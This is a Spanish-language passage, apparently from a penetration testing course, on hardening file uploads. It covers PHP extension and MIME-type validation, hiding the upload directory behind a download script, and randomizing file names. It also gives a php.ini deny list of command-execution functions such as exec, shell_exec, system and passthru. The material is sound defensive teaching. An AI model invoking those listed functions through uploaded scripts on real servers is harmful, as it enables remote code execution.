Como también hemos aprendido en este módulo, la validación de extensiones no es suficiente, ya que también debemos validar el contenido del archivo. No podemos validar uno sin el otro y siempre debemos validar tanto la extensión de archivo como su contenido. Además, siempre debemos asegurarnos de que la extensión de archivo coincida con el contenido del archivo.

El siguiente ejemplo nos muestra cómo podemos validar la extensión de archivo a través de la lista blanca y validar tanto la Firma de archivo como el encabezado HTTP Content-Type, al tiempo que garantizamos que ambos coincidan con nuestro tipo de archivo esperado:

Código: php

```php
$fileName = basename($_FILES["uploadFile"]["name"]);
$contentType = $_FILES['uploadFile']['type'];
$MIMEtype = mime_content_type($_FILES['uploadFile']['tmp_name']);

// whitelist test
if (!preg_match('/^.*\.png$/', $fileName)) {
    echo "Only PNG images are allowed";
    die();
}

// content test
foreach (array($contentType, $MIMEtype) as $type) {
    if (!in_array($type, array('image/png'))) {
        echo "Only PNG images are allowed";
        die();
    }
}
```

---

## Cargar Divulgación

Otra cosa que debemos evitar hacer es revelar el directorio de cargas o proporcionar acceso directo al archivo cargado. Siempre se recomienda ocultar el directorio de cargas de los usuarios finales y solo permitirles descargar los archivos cargados a través de una página de descarga.

Podemos escribir un `download.php` script para obtener el archivo solicitado del directorio de cargas y luego descargar el archivo para el usuario final. De esta manera, la aplicación web oculta el directorio de cargas y evita que el usuario acceda directamente al archivo cargado. Esto puede reducir significativamente las posibilidades de acceder a un script cargado maliciosamente para ejecutar código.

Si utilizamos una página de descarga, debemos asegurarnos de que el `download.php` script solo otorga acceso a archivos propiedad de los usuarios (es decir, evitar `IDOR/LFI` vulnerabilidades) y que los usuarios no tengan acceso directo al directorio de cargas (es decir, que `403 error`). Esto se puede lograr utilizando el `Content-Disposition` y `nosniff` encabezados y utilizando una precisión `Content-Type` encabezado.

Además de restringir el directorio de cargas, también debemos aleatorizar los nombres de los archivos cargados en el almacenamiento y almacenar sus nombres originales "desinfectados" en una base de datos. Cuando el `download.php` el script necesita descargar un archivo, obtiene su nombre original de la base de datos y lo proporciona en el momento de la descarga para el usuario. De esta manera, los usuarios no conocerán el directorio de cargas ni el nombre del archivo cargado. También podemos evitar vulnerabilidades causadas por inyecciones en los nombres de archivo, como vimos en la sección anterior.

Otra cosa que podemos hacer es almacenar los archivos cargados en un servidor o contenedor separado. Si un atacante puede obtener la ejecución remota de código, solo comprometería el servidor de cargas, no todo el servidor de back-end. Además, los servidores web se pueden configurar para evitar que las aplicaciones web accedan a archivos fuera de sus directorios restringidos mediante el uso de configuraciones como (`open_basedir`) en PHP.

---

## Más Seguridad

Los consejos anteriores deberían reducir significativamente las posibilidades de cargar y acceder a un archivo malicioso. Podemos tomar algunas otras medidas para garantizar que el servidor de back-end no se vea comprometido si se omite alguna de las medidas anteriores.

Una configuración crítica que podemos agregar es deshabilitar funciones específicas que se pueden usar para ejecutar comandos del sistema a través de la aplicación web. Por ejemplo, para hacerlo en PHP, podemos usar el `disable_functions` configuración en `php.ini` y agregue funciones tan peligrosas, como `exec`, `shell_exec`, `system`, `passthru`y algunos otros.

Otra cosa que debemos hacer es desactivar la visualización de cualquier error del sistema o del servidor, para evitar la divulgación de información confidencial. Siempre debemos manejar los errores a nivel de aplicación web e imprimir errores simples que explican el error sin revelar ningún detalle sensible o específico, como el nombre del archivo, el directorio de cargas o los errores sin procesar.

Finalmente, los siguientes son algunos otros consejos que debemos considerar para nuestras aplicaciones web:

- Limite el tamaño del archivo
- Actualizar cualquier biblioteca usada
- Escanee archivos cargados en busca de malware o cadenas maliciosas
- Utilice un Firewall de Aplicación Web (WAF) como capa secundaria de protección

Una vez que realizamos todas las medidas de seguridad discutidas en esta sección, la aplicación web debe ser relativamente segura y no vulnerable a las amenazas comunes de carga de archivos. Al realizar una prueba de penetración web, podemos usar estos puntos como una lista de verificación y proporcionar los que faltan a los desarrolladores para llenar los vacíos restantes.